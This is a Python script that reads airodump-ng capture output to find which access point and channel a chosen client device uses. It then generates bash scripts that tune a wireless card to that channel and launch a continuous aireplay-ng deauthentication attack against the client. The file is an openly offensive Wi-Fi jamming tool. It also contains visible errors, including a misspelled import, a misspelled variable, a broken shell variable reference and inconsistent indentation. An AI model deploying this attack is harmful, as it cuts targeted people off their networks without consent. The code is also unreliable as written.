import argparseo

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--mac', dest='mac', required = True, type=str)
    parser.add_argument('--src', dest='src', required = True, type=str)
    paser.add_argument('--inface', dest='iface', required=True, type=str)
    args = parser.parse_args()

    # grab the MAC address of the client we're looking for,
    # the filename or airodump output, and the interface    
    MAC_ADDRESS = args.mac
    FILENAME = args.src
    IFACE = args.iface

    channel_dct = {}
    client_dct = {}
    first_half = True
    
    # iterate through lines in the file building up the information we care about
    # channel_dct is mappings of AP BSSID's to the channel's they're on, 
    # client_dct is mappings of Client MAC's to the AP's they're connected to
    for line in open(FILENAME, 'r'):
        line = line.split(",")
        # account for random newlines
        if len(line) < 2:
            continue
        first_half = False if 'Station MAC' in line or first_half == False else True
        # parse the first half of the CSV output
        if first_half:
            if 'BSSID' in line:
                continue
            else:
                channel_dct[line[0].strip()] = line[3].strip()
        # parse the second half of the CSV output
        else:
            if 'Station MAC' in line:
                continue
            else:
                client_dct[line[0].strip()] = line[5].strip() 
    
   # write two files -- set_channel.sh, to be executed right after this script finishes
   # which uses airodump to set our interface to the same channel as the AP the client
   # is connect to (TODO: can I just use iwconfig?)
   # second file -- deauth.sh, to be called once we hear the keyword, will actually 
   # launch a continuous deauth attack 
   if MAC_ADDRESS in client_dct:
        # writes a script bash script that sets our adapter to the right channel
        with open('set_channel.sh', 'w') as f:
            chan = channel_dct[client_dct[MAC_ADDRESS]]
            f.write("#!/bin/bash\n")
            f.write('{ airodump-ng -c ' + chan + ' ' + IFACE +'; } &\nPID=$!\nkill -TERM PID\n')
        # writes the actual line we need to deauth
        with open('deauth.sh', 'w') as f:
            f.write("#!/bin/bash\n")
            f.write('aireplay-ng -0 0 -a ' + client_dct[MAC_ADDRESS] + ' -c' + MAC_ADDRESS + ' ' + IFACE)
